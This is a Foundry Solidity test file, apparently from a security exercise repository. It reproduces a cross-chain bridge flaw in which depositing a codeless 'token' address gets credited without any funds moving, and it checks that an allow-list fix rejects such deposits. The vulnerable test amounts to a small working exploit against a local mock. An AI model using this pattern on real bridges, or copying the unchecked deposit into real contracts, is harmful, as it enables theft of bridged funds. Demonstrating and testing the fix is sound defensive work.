// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Test} from "forge-std/Test.sol";
import {MockERC20} from "./mocks/MockERC20.sol";
import {VulnerableBridge, SafeBridge} from "../src/bridge/Bridge.sol";

/// PoC for a bridge crediting a deposit of a no-code token (Qubit qBridge-class, ~$80M, 2022-01).
///   forge test --match-contract BridgeNoCodeToken -vvv
///
/// Invariant (SC02): the bridge may only credit a deposit after real tokens of a known asset have
/// actually arrived. A raw transferFrom to a codeless address returns success without moving
/// anything; a code-existence + allow-list check holds.
///
/// See docs/exploits/bridge-deposit-no-code-token.md
contract BridgeNoCodeTokenTest is Test {
    address attacker = makeAddr("attacker");
    address ghostToken = makeAddr("ghostToken"); // an address with no contract code

    function test_vulnerable_creditsNoCodeToken() public {
        VulnerableBridge bridge = new VulnerableBridge();

        // Attacker holds nothing, deposits a codeless "token": the call returns (true, "").
        vm.prank(attacker);
        bridge.deposit(ghostToken, 1_000_000e18);

        assertEq(
            bridge.bridgedBalance(attacker),
            1_000_000e18,
            "bridge credited a deposit that never moved any tokens"
        );
    }

    function test_safe_rejectsNoCode_acceptsRealToken() public {
        MockERC20 real = new MockERC20();
        address[] memory tokens = new address[](1);
        tokens[0] = address(real);
        SafeBridge bridge = new SafeBridge(tokens);

        // The codeless token is rejected (not allow-listed and has no code).
        vm.prank(attacker);
        vm.expectRevert(bytes("token not allow-listed"));
        bridge.deposit(ghostToken, 1_000_000e18);

        // A real, allow-listed token works and actually moves funds.
        real.mint(attacker, 100e18);
        vm.startPrank(attacker);
        real.approve(address(bridge), type(uint256).max);
        bridge.deposit(address(real), 100e18);
        vm.stopPrank();

        assertEq(bridge.bridgedBalance(attacker), 100e18, "credited only the real deposit");
        assertEq(real.balanceOf(address(bridge)), 100e18, "tokens actually arrived");
        assertEq(real.balanceOf(attacker), 0, "attacker actually paid");
    }
}
